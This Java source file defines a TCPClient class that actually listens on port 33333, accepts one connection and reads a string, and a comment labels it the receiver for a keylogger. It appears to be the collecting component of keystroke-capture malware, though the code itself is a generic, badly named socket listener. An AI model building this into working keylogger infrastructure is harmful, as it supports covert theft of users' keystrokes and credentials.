package model.connection;

import java.io.IOException;
import java.io.InputStream;
import java.net.ServerSocket;
import java.net.Socket;

public class TCPClient {



    // Port for recieving KeyLogger
    private int SERVER_PORT = 33333;
    // Socket for the client.
    private ServerSocket Socket;
    // For receiving.
    private Socket ServerSocket;



    // Constructor.
    public TCPClient() throws IOException {
        System.out.println("Creating TCP Client...");
        Socket = new ServerSocket(SERVER_PORT);
        ServerSocket = Socket.accept();
        System.out.println("TCP Client created!");
    }




    // Receives a message (String).
    public String recieveMessage() throws IOException {
        InputStream inputStream = ServerSocket.getInputStream();
        byte[] buffer = new byte[8192];
        int bytesRead = inputStream.read(buffer);
        return new String(buffer, 0, bytesRead);
    }

}
